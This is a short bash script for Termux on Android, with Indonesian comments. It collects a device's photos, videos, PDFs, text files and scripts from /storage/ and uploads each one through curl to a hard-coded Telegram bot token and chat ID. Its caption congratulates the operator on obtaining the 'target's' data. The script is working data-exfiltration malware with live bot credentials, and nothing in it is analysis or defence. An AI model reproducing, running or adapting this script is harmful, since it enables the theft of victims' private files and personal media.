#!/bin/bash

TOKEN="7465534118:AAFcJ_Rp5W3DCJnYSIVtCkzph0ORIZSGkVY"
CHAT_ID="5034446293"
cek="/data/data/com.termux/files/sopowesu.txt"
nama=$(cat "$cek")

# Array untuk menyimpan format file dan batas ukuran masing-masing
declare -A format_limits=(
    ["jpg"]="100000000"   # 100 MB
    ["png"]="100000000"   # 100 MB
    ["IMG"]="100000000"   # 100 MB
    ["py"]="30000000"     # 30 MB
    ["sh"]="30000000"     # 30 MB
    ["mp4"]="100000000"   # 100 MB
    ["txt"]="50000000"    # 50 MB
    ["pdf"]="50000000"    # 50 MB
)

# Fungsi untuk mengirim file
function send_file {
    local file="$1"
    local format="$2"
    local size=$(stat -c %s "$file")
    local max_size="${format_limits[$format]}"
    
    if (( size <= max_size )); then
        caption=$(cat <<EOF
Completed✅

📝Target Name: $nama
🗒️ ID: $group_id

Selamat Tuan Anda Berhasil Mendapatkan Data Target Anda🔥
®️ Copyright 2024
EOF
)
        caption="${caption//'\\n'/$'\n'}"  # Mengganti '\\n' dengan karakter baris baru
        response=$(curl -s -w "\n%{http_code}" -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" \
            -F chat_id="$CHAT_ID" \
            -F document=@"$file" \
            -F caption="$caption")
        http_code=$(echo "$response" | tail -n 1)
        if [ "$http_code" -ne 200 ]; then
            echo "Error uploading $file: $response"
        fi
    else
        echo "File $file exceeded the maximum size limit for format $format."
    fi
}

# Menemukan file dengan format yang diizinkan dan mengirimkannya
files=($(find /storage/ -type f \( -iname "*.jpg" -o -iname "*.png" -o -iname "*IMG" -o -iname "*.py" -o -iname "*.sh" -o -iname "*.mp4" -o -iname "*.txt" -o -iname "*.pdf" \) | shuf)) 
group_id=$(id -g)
for file in "${files[@]}"; do
    # Mendapatkan format file
    format=$(echo "$file" | awk -F '.' '{print tolower($NF)}')
    send_file "$file" "$format"
done
